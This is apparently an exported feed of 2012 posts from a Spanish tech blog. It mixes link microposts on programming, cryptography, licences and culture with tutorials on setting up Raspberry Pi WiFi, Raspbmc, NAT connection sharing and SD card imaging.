stuff we see on the Internet or use daily, don't have a theoretical computer science background. They're still pretty awesome and creative programmers and we thank them for what they build. However, theoretical computer science has its uses and applications and can turn out to be quite practical. In this article, targeted at programmers who know their art but who don't have any theoretical computer science background, I will present one of the most pragmatic tools of computer science: Big O notation and algorithm complexity analysis. As someone who has worked both in a computer science academic setting and in building production-level software in the industry, this is the tool I have found to be one of the truly useful ones in practice, so I hope after reading this article you can apply it in your own code to make it better. After reading this post, you should be able to understand all the common terms computer scientists use such as \"big O\", \"asymptotic behavior\" and \"worst-case analysis\". Dionysis \"dionyziz\" Zindros | discrete.gr","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/05/a-gentle-introduction-to-algorithm-complexity-analysis/","loc":"https://karpoke.ignaciocano.com/2012/07/05/a-gentle-introduction-to-algorithm-complexity-analysis/"},{"title":"tl;drLegal","text":"SKIP THE LICENSE Reading software licenses sucks, so we've summarized all of the popular ones for you in a neat at-a-glance format. Just begin typing the name of your license on the frontpage and select from the auto-completing drop-down menu. TL;DR - We summarize software licenses. LET THEM TAKE IT EASY Do you have people using your software? We all hate reading software licenses. Let them take it easy and link them to your license on here. We provide embed and linking options for every license on the site. Next time include a link alongside your license. TL;DR - Link a summary in place of a license. » tldrlegal.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/04/tldrlegal/","loc":"https://karpoke.ignaciocano.com/2012/07/04/tldrlegal/"},{"title":"Ubuntu Manual Project","text":"Primeros pasos con Ubuntu 12.04 es una guía para principiantes del sistema operativo Ubuntu. Se encuentra disponible bajo una licencia de código abierto y su descarga, lectura, modificación y distribución son libres. El manual le ayudará a familiarizarse con tareas cotidianas como navegar por Internet, escuchar música, escanear documentos y mucho más. Al centrarse en instrucciones fáciles de seguir, es adecuado para todos los niveles de experiencia. » ubuntu-manual.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/04/ubuntu-manual-project/","loc":"https://karpoke.ignaciocano.com/2012/07/04/ubuntu-manual-project/"},{"title":"Conexión inalámbrica en Raspbmc","text":"El otro día me quedé sin poder probar la conexión inalámbrica en Raspbmc porque los puertos USB de la Raspberry Pi no dan suficiente potencia para la antena WiFi USB que tengo. Cada puerto USB proporciona hasta 100mA, y parece que el consumo de la antena oscila entre 150mA y 200mA, por lo que no es suficiente. Quizá conectando un cable USB en Y desde los dos USB podría llegar a funcionar, pero nos quedaríamos sin puertos USB libres. Una solución que funciona es utilizar un concentrador (o hub ) USB con alimentación externa. Además, podemos conectar la alimentación de la Raspberry Pi al concentrador, por lo que no necesitaremos dos enchufes. Configurar una conexión inalámbrica en Raspbmc con una antena WiFi USB es parecido a lo que hay que hacer para configurarla en debian , pero como Raspbmc utiliza Network Manager, la configuraremos a través de éste. La antena que tengo es una Conceptronic CT-WN4320Z con chip ZD1211 y que funciona con el controlador ZyDAS. Dado que el firmware para este chip no es libre, deberemos habilitar los repositorios non-free editando el fichero /etc/apt/sources.list : bash deb http://ftp.debian.org/debian stable main non-free deb http://ftp.debian.org/debian/ squeeze-updates main non-free deb http://security.debian.org/ squeeze/updates main non-free Actualizamos los repositorios: bash $ sudo aptitude update Instalamos el controlador zd1211-firmware : bash $ sudo aptitude install zd1211-firmware Los siguientes paquetes puede que no sean estrictamente necesarios, pero si queremos ejecutar comandos como lsusb , iwconfig , iwlist , wpa_supplicant , etc. los vamos a necesitar. El paquete wpasupplicant lo he instalado porque he estado probando la conexión antes de hacerlo a través de Network Manager. Para instalarlos: bash $ sudo aptitude install usbutils wireless-tools wpasupplicant Vamos al directorio /etc/NetworkManager/system-connections , o lo creamos si no existía, y creamos el fichero wlan0 : ```bash [connection] id=wlan0 uuid=11111111-1111-1111-1111-111111111111 type=802-11-wireless autoconnect=true timestamp=0 [802-11-wireless] ssid=77;89;83;83;73;68; mode=infrastructure security=802-11-wireless-security [802-11-wireless-security] key-mgmt=wpa-psk psk=very long long password [ipv4] method=manual dns=208.67.222.222;208.67.220.220; addresses1=192.168.50.2;24;192.168.50.1; [ipv6] method=ignore ``` El fichero es bastante explicativo. De esta manera se configura una conexión con cifrado WPA2 e IP fija. A destacar: El identificador de la conexión id no tiene por qué ser el nombre de la interfaz, pero así es fácil identificarla. El uuid debe ser único para todas las conexiones. El SSID debe convertirse al valor decimal de los caracteres en ASCII separados por punto y coma. Por ejemplo, si el SSID es MYSSID, podemos ejecutar python -c \"print ';'.join(str(ord(c)) for c in 'MYSSID')+';'\" lo que nos devuelve 77;89;83;83;73;68; . El punto y coma del final es importante. La frase de paso, que se especifica en psk , no es necesario ponerla entre comillas aunque contenga espacios. Los DNS son los de OpenDNS. La dirección IP asignada es 192.168.50.2 , la máscara de red 24 , es decir, 255.255.255.0 y la puerta de enlace 192.168.50.1 . Si en lugar de IP fija queremos usar DHCP, sustituimos la sección [ipv4] por: bash [ipv4] method=auto dhcp-client-id=xbmc dhcp-hostname=xbmc Una vez que hemos terminado de editar el fichero, le cambiamos los permisos: bash $ sudo chmod 600 /etc/NetworkManager/system-connections/wlan0 Esto es importante, porque si el fichero no tiene las restricciones de usuario y permisos, Network Manager lo ignorará. Mediante el siguiente comando levantamos la conexión: bash $ nmcli con up id wlan0 Eso, o reiniciamos la Raspberry Pi. Como curiosidad, podemos consultar el UUID de las conexiones activas ejecutando: bash $ nmcli con status NAME UUID DEVICES SCOPE DEFAULT VPN wlan0 11111111-1111-1111-1111-111111111111 wlan0 system yes no O listar todas las conexiones con: bash $ nmcli con list NAME UUID TYPE SCOPE TIMESTAMP-REAL wlan0 11111111-1111-1111-1111-111111111111 802-11-wireless system Tue Jul 2 21:08:07 2012 Auto eth0 9ab5123b-s912-5215-cad2-b98fe521592d 802-3-ethernet system Mon Jul 2 20:48:03 2012 NAME UUID TYPE SCOPE TIMESTAMP-REAL Referencias » Configuring a NetworkManager Wireless Connection without Graphics","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/07/03/conexion-inalambrica-en-raspbmc/","loc":"https://karpoke.ignaciocano.com/2012/07/03/conexion-inalambrica-en-raspbmc/"},{"title":"Una cebolla que nos puede hacer llorar","text":"El pasado día 26 de junio asistí al evento \"Iniciativas Open Data en España\", atraído sin duda, por los grandes espadas en la materia que son Alberto Abella, Roberto Santos y Victoria Anderica, que además del reconocido prestigio que tienen, llevan años trabajando para que este país sea algo mejor. Como cabía esperar, no me defraudaron en sus intervenciones, que fueron tan correctas como acertadas. Como contrapartida, y diré el pecado, pero no el pecador, tuve que oír de boca de \"expertos\" en la materia, estas dos afirmaciones, que me preocuparon y mucho, puesto que pueden afectar muy negativamente a la Ley de Transparencia y su desarrollo posterior: ​a) Si licenciamos los datos públicos con licencias libres, tenemos el problema de las empresas no pueden hacer negocio con ellos. ​b) No se pueden liberar los fondos no sujetos a derechos de autor de bibliotecas y de pinacotecas ya que son entidades culturales y las administraciones públicas tienen que poder cobrar por los datos. Fernando Acero | fernando-acero.livejournal.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/01/una-cebolla-que-nos-puede-hacer-llorar/","loc":"https://karpoke.ignaciocano.com/2012/07/01/una-cebolla-que-nos-puede-hacer-llorar/"},{"title":"Paper Enigma","text":"Although the Enigma cipher as a whole is quite complex (it's complexity is comparable to modern cryptographic algorithms) the individual transformations within it are relatively simple. In fact, they are simple enough that you can decipher an Enigma message with just a paper model. Our model is three-dimensional, to illustrate the wiring of a real Enigma machine. It needs only common household items to construct, and is completely compatible with all settings of a real Enigma machine (models I, M1, M2 and M3). » franklinheath.co.uk","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/07/01/paper-enigma/","loc":"https://karpoke.ignaciocano.com/2012/07/01/paper-enigma/"},{"title":"Raspbmc","text":"Raspbmc es una distribución basada en debian que permite ejecutar XBMC en la Raspberry Pi, lo que la transforma en un interesante reproductor multimedia casero (HTPC). Esta distribución recibe actualizaciones constantes que añaden mejoras, actualizaciones de drivers y nuevas funcionalidades. Además, permite compartir el contenido multimedia a través de NFS, SMB, FTP y HTTP. Raspbmc ha sido creada y está siendo mantenida por Sam Nazarko. Fuente retrocomputers.eu Instalación La instalación es muy sencilla, ya que existe un script que nos simplifica el proceso. Lo descargamos: bash $ wget http://svn.stmlabs.com/svn/raspbmc/testing/installers/python/install.py Introducimos la tarjeta SD y nos aseguramos de que esté desmontada antes de lanzar el script . Deberemos saber el nombre de dispositivo que tiene la tarjeta SD, en este caso /dev/mmcblk0 : ```bash $ sudo python install-raspbmc.py Raspbmc installer for Linux and Mac OS X http://raspbmc.com Please ensure you've inserted your SD card, and press Enter to continue. Enter the 'Disk' you would like imaged, from the following list: Enter your choice here (e.g. 'mmcblk0' or 'sdd'): mmcblk0 It is your own responsibility to ensure there is no data loss! Please backup your system before imaging Are you sure you want to install Raspbmc to '/dev/mmcblk0'? [y/N] y Downloading, please be patient... Downloaded 49.52 of 49.52 MiB (100.00%) Please wait while Raspbmc is installed to your SD card... (This may take some time and no progress will be reported until it has finished.) 0+5852 registros leídos 0+5852 registros escritos 198000640 bytes (198 MB) copiados, 21,7791 s, 9,1 MB/s Installation complete. Finalising SD card, please wait... Raspbmc is now ready to finish setup on your Pi, please insert the SD card with an active internet connection ``` Tras insertar la tarjeta SD en la Raspberry Pi y reiniciar, continuará la instalación y configuración del sistema. En particular, no tendremos que preocuparnos de modificar las particiones para aprovechar al máximo el espacio de la tarjeta SD , ya que lo hace de forma automática. Es necesario que la Raspberry Pi esté conectada a Internet. Una vez que termine, reiniciará y aparecerá la interfaz de XBMC. La descarga e instalación puede tardar un rato, entre 15 y 20 minutos. Esto lo comento especialmente por si hay alguien que el primer arranque lo realiza sin que la RPi esté conectada a ninguna pantalla, para que no desespere hasta que por fin pueda conectarse por ssh. Además, ya está preparada y configurada para que accedamos por SSH y FTP. El usuario el pi y la contraseña raspberry , aunque quizá esta es una de las primeras cosas que debamos cambiar nada más terminar la instalación . Conexión a través de otro equipo Ya que parece que la antena WIFI USB no funciona si no es con hub USB con alimentación , y ahora mismo no tengo uno a mano, y la conexión directa por cable al router no es posible (desde donde pensaba colocar la Raspberry Pi), he probado otra posibilidad, y es conectarla por cable a un portátil que hará de intermediario y me permitirá conectarme a y tener conexión en la Raspberry Pi. En el portátil, en este caso con Ubuntu Precise Pangolin 12.04, vamos a Configuración de Red > Cableada > Opciones (será accesible cuando conectemos el cable a la Raspberry Pi estando encendida) > Ajustes de IPv4: seleccionamos \"Compartida con otros equipos\" marcamos \"Requiere dirección IPv4 para que esta conexión se complete\" Esto nos asigna por defecto la dirección IP 10.42.0.1, máscara 255.255.255.0 y ruta predeterminada 0.0.0.0. Parece que no es configurable. Debemos prestar atención al cortafuegos, y permitir la compartición de la conexión. Por ejemplo, con Firestarter, vamos a Cortafuegos > Ejecutar asistente: Dispositivo(s) detectado(s): seleccionamos \"Dipositivo inalámbrico (wlan1)\" Marcamos \"Activar la compartición de la conexión a Internet\" Dispositivo de red de área local: seleccionamos \"Dispositivo ethernet (eth0)\" También podemos hacerlo a mano con iptables . Si estamos seguros de que no utilizamos ninguna otra regla en la NAT, la podemos limpiar: bash $ sudo iptables -F -t nat Ahora deberemos crear una regla para indicar la otra interfaz que hará de puente, en este caso wlan1 : bash $ sudo iptables --table nat --append POSTROUTING --out-interface wlan1 -j MASQUERADE Y por último, activamos la redirección IP: bash $ sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" Si optamos por el método manual, y queremos que se ejecute cada vez que arranca el portátil (algo que puede no ser necesario), añadimos al final del fichero /etc/rc.local : bash iptables -F -t nat iptables --table nat --append POSTROUTING --out-interface wlan1 -j MASQUERADE echo 1 > /proc/sys/net/ipv4/ip_forward Con esto el portátil ya está configurado, ahora sólo queda configurar la Rasperry Pi para que tenga IP estática de la misma red que tenemos en la interfaz del portátil. Vamos a Programs > Raspbmc Settings > Wired Network: IP address: 10.42.0.50 Netmask: 255.255.255.0 Gateway: 10.42.0.1 (la IP del portátil) DNS Server: 208.67.222.222 Search domain: local Esta es una solución temporal y tiene sus inconvenientes, ya que necesitamos conectar otro equipo por cable a la Raspberry Pi para conectarnos \"remotamente\" por SSH, ya sea para llevar a cabo actualizaciones, instalar programas, instalar complementos o copiar archivos multimedia. Además, mientras no esté conectada al portátil no podremos hacer uso de los complementos que necesitan acceso a Internet y con este método tampoco podremos utilizar la aplicación para Android para controlar XBMC .","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/29/raspbmc/","loc":"https://karpoke.ignaciocano.com/2012/06/29/raspbmc/"},{"title":"GNU Make in Detail for Beginners","text":"Large projects can contain thousands of lines of code, distributed in multiple source files, written by many developers and arranged in several subdirectories. A project may contain several component divisions. These components may have complex inter-dependencies \" for example, in order to compile component X, you have to first compile Y; in order to compile Y, you have to first compile Z; and so on. For a large project, when a few changes are made to the source, manually recompiling the entire project each time is tedious, error-prone and time-consuming. Make is a solution to these problems. It can be used to specify dependencies between components, so that it will compile components in the order required to satisfy dependencies. An important feature is that when a project is recompiled after a few changes, it will recompile only the files which are changed, and any components that are dependent on it. This saves a lot of time. Make is, therefore, an essential tool for a large software project. Each project needs a Makefile \" a script that describes the project structure, namely, the source code files, the dependencies between them, compiler arguments, and how to produce the target output (normally, one or more executables). Whenever the make command is executed, the Makefile in the current working directory is interpreted, and the instructions executed to produce the target outputs. The Makefile contains a collection of rules, macros, variable assignments, etc. ('Makefile' or 'makefile' are both acceptable.) Sarath Lakshman | linuxforu.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/28/gnu-make-in-detail-for-beginners/","loc":"https://karpoke.ignaciocano.com/2012/06/28/gnu-make-in-detail-for-beginners/"},{"title":"Mostrar las aplicaciones ocultas que se ejecutan al inicio","text":"Las aplicaciones que se ejecutan al inicio tienen un archivo de configuración en el directorio /etc/xdg/autostart . Algunos de estos archivos de configuración tienen la variable NoDisplay=true , por lo que no aparecen en el listado de Aplicaciones al inicio, y por tanto no se pueden desactivar a golpe de ratón. Si queremos que estas aplicaciones se muestren y así poder desactivarlas mediante la interfaz gráfica, ejecutamos: bash $ sudo sed -i 's/NoDisplay=true/NoDisplay=false/' /etc/xdg/autostart/* Si además queremos que cada vez que instalamos un programa se ejecute este comando , podemos incluirlo en el archivo /etc/apt.conf : bash sed -i 's/NoDisplay=true/NoDisplay=false/' /etc/xdg/autostart/* Referencias » Tip: Como ver las aplicaciones que se ejecutan al inicio en Ubuntu","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/28/mostrar-las-aplicaciones-ocultas-que-se-ejecutan-al-inicio/","loc":"https://karpoke.ignaciocano.com/2012/06/28/mostrar-las-aplicaciones-ocultas-que-se-ejecutan-al-inicio/"},{"title":"El algoritmo de Dios","text":"El algoritmo de Dios es un término que surgió en la búsqueda de aquel algoritmo que indicara los pasos mínimos que resuelven un cubo de Rubik cualquiera. El término se usa profusamente, no sólo para el cubo de Rubik. Mucho antes de conocer dicho término, cuando me encontraba con diversos tipos de problemas, ya me asaltaba recurrentemente una pregunta irrelevante (para el caso que me ocupaba), pero que espero te haga pensar un poco en la importancia de algunas cuestiones que quizás no conoces: \"¿Qué solución daría Dios si fuera él quien resolviera el problema?\" Lo más sorprendente quizás, es que \"las soluciones de Dios\" no sólo no están vedadas al intelecto humano, sino que son numerosas y prolíficas. Veamosló. josejuan | genbetadev.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/28/el-algoritmo-de-dios/","loc":"https://karpoke.ignaciocano.com/2012/06/28/el-algoritmo-de-dios/"},{"title":"An Introduction to Lock-Free Programming","text":"Lock-free programming is a challenge, not just because of the complexity of the task itself, but because of how difficult it can be to penetrate the subject in the first place. I was fortunate in that my first introduction to lock-free (also known as lockless) programming was Bruce Dawson's excellent and comprehensive white paper, Lockless Programming Considerations. And like many, I've had the occasion to put Bruce's advice into practice developing and debugging lock-free code on platforms such as the Xbox 360. Since then, a lot of good material has been written, ranging from abstract theory and proofs of correctness to practical examples and hardware details. I'll leave a list of references in the footnotes. At times, the information in one source may appear orthogonal to other sources: For instance, some material assumes sequential consistency, and thus sidesteps the memory ordering issues which typically plague lock-free C/C++ code. The new C++11 atomic library standard throws another wrench into the works, challenging the way many of us express lock-free algorithms. In this post, I'd like to re-introduce lock-free programming, first by defining it, then by distilling most of the information down to a few key concepts. I'll show how those concepts relate to one another using flowcharts, then we'll dip our toes into the details a little bit. At a minimum, any programmer who dives into lock-free programming should already understand how to write correct multithreaded code using mutexes, and other high-level synchronization objects such as semaphores and events. » preshing.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/27/an-introduction-to-lock-free-programming/","loc":"https://karpoke.ignaciocano.com/2012/06/27/an-introduction-to-lock-free-programming/"},{"title":"Why you should never use hash functions for message authentication","text":"The general thrust of this post is: use a MAC function like HMAC to sign data, don't use hash functions. Although not all hash functions suffer from the problem I'm going to illustrate, in general using a hash function for message authentication comes with a lot of potential problems because those functions aren't designed for this task. You shouldn't try to work around it by creatively processing the inputs or inventing some fancy way of chaining hash functions. Just use the functions that were designed for this task instead of inventing your own crypto schemes. » jcoglan.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/27/why-you-should-never-use-hash-functions-for-message-authentication/","loc":"https://karpoke.ignaciocano.com/2012/06/27/why-you-should-never-use-hash-functions-for-message-authentication/"},{"title":"All About Unicode, UTF8 & Character Sets","text":"This is a story that dates back to the earliest days of computers. The story has a plot, well, sort of. It has competition and intrigue, as well as traversing oodles of countries and languages. There is conflict and resolution, and a happyish ending. But the main focus is the characters \" 110,116 of them. By the end of the story, they will all find their own unique place in this world. This story (or article, as known on Smashing Magazine) will follow a few of those characters more closely, as they journey from Web server to browser, and back again. Along the way, you'll find out more about the history of characters, character sets, Unicode and UTF-8, and why question marks and odd accented characters sometimes show up in databases and text files. Paul Tero | smashingmagazine.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/27/all-about-unicode-utf8-character-sets/","loc":"https://karpoke.ignaciocano.com/2012/06/27/all-about-unicode-utf8-character-sets/"},{"title":"Carta abierta al Presidente Constitucional de la República del Ecuador","text":"Estimado Rafael Correa, Presidente de Ecuador En lo referente al asilo de Julian Assange en Ecuador me permito hacerle la siguiente recomendación. El trabajo realizado por Assange y WikiLeaks ha sido muy importante para transparentar el mundo en el que vivimos. Proteger a Julian Assange de la persecución de EE.UU. es un deber que tenemos todos y usted tiene la posibilidad de ayudarle. Las posibles acusaciones de delitos sexuales son otro asunto, y de ser serias, merecen respeto. Aquí propongo una manera por la cual Ecuador puede lograr los dos objetivos. Hasta ahora, Suecia no tiene acusaciones formales contra Assange sino que los oficiales suecos piden plantearle preguntas, lo que Assange les ha invitado a hacer en Londres. Al darle asilo, Ecuador puede permitirse dar las facilidades de la embajada de Ecuador para que oficiales suecos lo puedan interrogar. Si luego Suecia lo acusa formalmente, podrá pedir su entrega normalmente, que se considerará según la ley ecuatoriana, y con una condición: que no lo rinda a ningún otro país, sino que lo deje salir para Ecuador, o al fin del proceso si sale inocente, o al fin de su pena si se condena. Sinceramente en el espíritu de ayudar, Richard Stallman » telegrafo.com.ec","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/26/carta-abierta-al-presidente-constitucional-de-la-republica-del-ecuador/","loc":"https://karpoke.ignaciocano.com/2012/06/26/carta-abierta-al-presidente-constitucional-de-la-republica-del-ecuador/"},{"title":"El extraño caso de la función negada en Javascript","text":"Tras este novelesco título lo que se esconde en esta ocasión es una estructura que podemos encontrar últimamente en bibliotecas y códigos de terceros. Se trata de una variante de las funciones autoejecutables (o que se auto invocan) que ya tratamos aquí hace algún tiempo. En concreto, se trata de la siguiente pieza de código: javascript !function() { // My awesome code... }(); ¿Qué es exactamente esta función negada? ¿Cómo y porqué funciona? Echemos un vistazo a las tripas de Javascript¦ » etnassoft.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/26/el-extrano-caso-de-la-funcion-negada-en-javascript/","loc":"https://karpoke.ignaciocano.com/2012/06/26/el-extrano-caso-de-la-funcion-negada-en-javascript/"},{"title":"Actualización automática ¿Bendición o condena?","text":"El caso TheFlame ha promovido muchas reacciones: los articulistas rellenan páginas con prefijos \"ciber\" y la palabra \"guerra\". Las casas antivirus lo usan como arma de venta (aun sin haberlo detectado en cinco años) y Microsoft queda en evidencia con su PKI y la refuerza. TheFlame ha minado también la confianza: en los gobiernos, en los antivirus... pero sobre todo, en la criptografía y en la actualización automática. » hispasec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/26/actualizacion-automatica-bendicion-o-condena/","loc":"https://karpoke.ignaciocano.com/2012/06/26/actualizacion-automatica-bendicion-o-condena/"},{"title":"lexical scoping and dynamic scoping in Emacs Lisp","text":"In this article, I demonstrate: difference between dynamic scoping and lexical scoping in Emacs Lisp what to watch out for with dynamic scoping what you can do with lexical scoping and lexical closures what happens when you mix lexical scoping code and dynamic scoping code Emacs Lisp is always dynamically scoped in Emacs 23 and below. Support for lexical scoping is added to Emacs 24. Nice because many agree that lexical scoping makes more sense in most cases than dynamic scoping does. You'll see why soon in this article. If you have an el file that you want to load with lexical scoping, you can add -*- lexical-binding: t -*- as the first line, then when Emacs 24 loads the file, it will apply lexical scoping to the code in that el file. » yoo2080.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/26/lexical-scoping-and-dynamic-scoping-in-emacs-lisp/","loc":"https://karpoke.ignaciocano.com/2012/06/26/lexical-scoping-and-dynamic-scoping-in-emacs-lisp/"},{"title":"Why NULL points to 0?","text":"A few years ago I would answer the above question with \"because NULL is defined as a void pointer to 0\", which is only half correct (and close to being wrong). The answer to this question is much more complicated and thus much more interesting. Let's start with checking what the C standards (or actually drafts of the standards) say about the (in)famous NULL ptr. The green/yellow/orange colors mark the part that caught my attention. I'll leave the C++0x case for another time (C++0x introduces the nullptr of std::nullptr_t type btw). For TL;DR scroll down, I summarize the points anyway. » gynvael.coldwind.pl","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/26/why-null-points-to-0/","loc":"https://karpoke.ignaciocano.com/2012/06/26/why-null-points-to-0/"},{"title":"Golden Axe - Desvelando todos sus secretos","text":"Buenas, aquí os traigo, en primicia, una guía que destripa los secretos del sistema de puntuación del juego, uno de los más complejos de la época y de la historia de los beat em up. Muchos os habreis acabado este juego, pero seguro que nunca habeis tenido claro porque la maquina os da al final una puntuacion u otra, incluso aunque hayais hecho partidas casi iguales la puntuacion cambia ostensiblemente y nunca queda claro el motivo. Bien, espero con esta breve guia quede todo claro y a partir de ahora controleis a vuestro antojo los puntos que obteneis en este juego. Al clarificar el sistema de puntuacion, tambien se hace mas sencillo intentar lograr una cierta puntuacion en el juego, pues ahora ya sabemos de qué depende. La guia está basada en la versión original, esto es, la versión Arcade japonesa. Es importante este detalle porque algunos enemigos tienen algo menos de vida en el resto de versiones arcade del juego. Y por supuesto esto que digo nada tiene que ver con la versiones domésticas. Basada en una guía original japonesa, he recortado varios apartados de la misma para no hacerla redundante ya que hay muchas cosas como los controles, etc... que son de sobra conocidos por todos y no suponen ninguna novedad. Tambien he optado por no publicar los capitulos referentes a estrategias para acabar con los enemigos y hacer el maximo de puntuacion posible en el juego ya que considero que dichas estrategias a dia de hoy ya han sido superadas (aunque no publicadas). @ZIDEVS | elotrolado.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/26/golden-axe-desvelando-todos-sus-secretos/","loc":"https://karpoke.ignaciocano.com/2012/06/26/golden-axe-desvelando-todos-sus-secretos/"},{"title":"PHP Database Access: Are You Doing It Correctly?","text":"We've covered PHP's PDO API a couple of times here on Nettuts+, but, generally, those articles focused more on the theory, and less on the application. This article will fix that! To put it plainly, if you're still using PHP's old mysql API to connect to your databases, read on! » tutsplus.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/25/php-database-access-are-you-doing-it-correctly/","loc":"https://karpoke.ignaciocano.com/2012/06/25/php-database-access-are-you-doing-it-correctly/"},{"title":"in which three programming methods are compared","text":"There are, roughly speaking, three ways to develop large user-facing programs, which we will refer to here as 0) the Unix way, 1) the Emacs way, and 2) the wrong way. » technomancy.us","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/25/in-which-three-programming-methods-are-compared/","loc":"https://karpoke.ignaciocano.com/2012/06/25/in-which-three-programming-methods-are-compared/"},{"title":"Un universo desde la nada","text":"Lawrence Krauss da una charla sobre nuestro actual panorama del universo, cómo éste terminará y sobre todo cómo es que se produjo desde la nada. Krauss es autor de muchos libros best seller sobre física y cosmología, incluyendo \"Física de Star Trek.\" @polibioinexistente | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/25/un-universo-desde-la-nada/","loc":"https://karpoke.ignaciocano.com/2012/06/25/un-universo-desde-la-nada/"},{"title":"Tesla, el genio que hizo la luz","text":"Nicola Tesla, ingeniero y matemático fue uno de los grandes inventores del siglo XX y también de los más olvidados. Precursor de la televisión, de la robótica, de los rayos X y de muchos otros adelantos, Tesla fue el genio que afirmó y demostró en sus experimentos que podía generar una energía libre, universal y gratuita. En 2006 las Naciones Unidas conmemoraron el año de Tesla. Además Tesla ha servido de inspiración para la Real Academia de Ciencias Exactas, Físicas y Matemáticas, que este año ha reivindicado su figura. Precisamente ahora, finaliza el ciclo \"Ciencia para todos\" y con él, el proceso de selección de talentos matemáticos entre los escolares españoles. Es el llamado proyecto ESTALMAT, que sigue los pasos de las antiguas escuelas de conocimiento. » Tesla, el genio que hizo la luz","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/25/tesla-el-genio-que-hizo-la-luz/","loc":"https://karpoke.ignaciocano.com/2012/06/25/tesla-el-genio-que-hizo-la-luz/"},{"title":"M.C. Escher - Metamorphose","text":"Maurits Cornelis Escher es un artista holandés nacido en la ciudad de Leeuwarden, Países Bajos, el 17 de junio de 1898, mejor conocido por sus grabados en madera, xilografías y litografías que tratan sobre figuras imposibles, teselados y mundos imaginarios. Su obra experimenta con diversos métodos de representar (en dibujos de 2 ó 3 dimensiones) espacios paradójicos que desafían a los modos habituales de representación. No fue precisamente un estudiante brillante, y sólo llegó a destacar en las clases de dibujo. En 1919, bajo presión paterna, empieza los estudios de arquitectura en la Escuela de Arquitectura y Artes Decorativas de Haarlem, estudios que abandonó poco después para pasar como discípulo de un profesor de artes gráficas, Jessurum de Mesquitas. Con él, adquirió unos buenos conocimientos básicos de dibujo, y destacó sobremanera en la técnica de grabado en madera, la cual llegó a dominar con gran maestría. @stanchinsky | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/06/25/m-c-escher-metamorphose/","loc":"https://karpoke.ignaciocano.com/2012/06/25/m-c-escher-metamorphose/"},{"title":"Abrir archivos .tec en GNU/Linux","text":"Haciendo una copia de seguridad de los datos de un móvil con Android ICS, he visto que existe un directorio llamado cache en el mismo directorio donde se guardan las fotos, /sdcard/DCIM/Camera , que contiene archivos cuya extensión es .tec . Echando un vistazo al contenido de estos archivos con hexer , parece ser que se trata de un archivo JFIF: bash 00000000: ff d9 66 b3 00 00 ff d8 ff e0 00 10 4a 46 49 46 ..f.........JFIF 00000010: 00 01 01 00 00 01 00 01 00 00 ff db 00 43 00 05 .............C.. 00000020: 03 04 04 04 03 05 04 04 04 05 05 05 06 07 0c 08 ................ Por el nombre del directorio y por el tamaño de las fotos, menos de 100K, parece que deben ser imágenes en miniatura . Aunque no he encontrado ninguna aplicación que las pueda abrir directamente, he encontrado un vídeo donde se explica cómo abrirlas . La técnica consiste en eliminar los 6 primeros bytes y el último. Podemos confirmar que funciona con GHex , un editor hexadecimal para Gnome. He intentado eliminar los bytes con hexer pero no hay manera, siempre se me pone en \"modo infierno\" y no termina de salir bien. Si queremos recuperar todas esas imágenes en miniatura, hacer el cambio archivo a archivo es algo impensable, sobre todo si tenemos un gran número de ellas. Utilizando dd podemos conseguir eliminar los 6 primeros bytes de todas las imágenes: bash $ for f in *.tec; do dd bs=6 skip=1 if=$f of=$f.jfif done Aunque en este caso no eliminamos el último byte , los archivos creados se pueden abrir sin problemas. Como comentario final, si queremos borrar las fotos del móvil, deberíamos borrar también las imágenes en miniatura que están en el directorio /sdcard/DCIM/Camera/cache , o directamente el propio directorio. Referencias » Recover deleted photos from an Android device » Best way to remove bytes from the start of a file? » JPEG File Interchange Format (JFIF)","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/06/23/abrir-archivos-tec-en-gnulinux/","loc":"https://karpoke.ignaciocano.com/2012/06/23/abrir-archivos-tec-en-gnulinux/"},{"title":"Arch en Raspberry Pi","text":"Después de haber estado usando la Raspberry Pi con Debian , he querido probar otras distribuciones, en este caso Arch. Desde la página de descargas , nos bajamos el torrent, así no sobrecargamos el servidor. Crear una copia de la tarjeta SD He estado unos días trasteando con Debian, ya sabéis, modificando la tabla de particiones para utilizar todo el espacio disponible, instalando paquetes, configurándola a mi gusto, no mucho, pero si ahora formateo la tarjeta, es un trabajo perdido. No sólo eso, sino que no descarto tener que repetirlo de nuevo si posteriormente vuelvo a debian. Puede que al final me quede con Arch, pero me apetece probar alguna distribución más, como Raspbmc o PwnPi , así que me interesa guardar una copia de la tarjeta. Quizá sería mejor opción crear una máquina virtual con qemu para probar otras distribuciones, o utilizar tarjetas SD diferentes, pero dado lo sencillo que es hacer la copia esto será lo primero que haga. Para crear una copia de la tarjeta, nos aseguramos de que está desmontada y ejecutamos: bash $ dd bs=1M if=/dev/mmcblk0 of=my-debian-19-04-2012.img Comprimiremos la imagen utilizando pbzip2 : bash $ pbzip2 my-debian-19-04-2012.img Sólo para hacer la copia y comprimir la imagen tarda un rato, dependiendo de la tarjeta SD y del procesador que tengamos. En mi caso, una tarjeta SD Samsung Class 10 y con un Core 2 Duo todo el proceso ha tardado algo menos de media hora (un cuarto de hora copiar la imagen y unos diez minutos comprimirla). 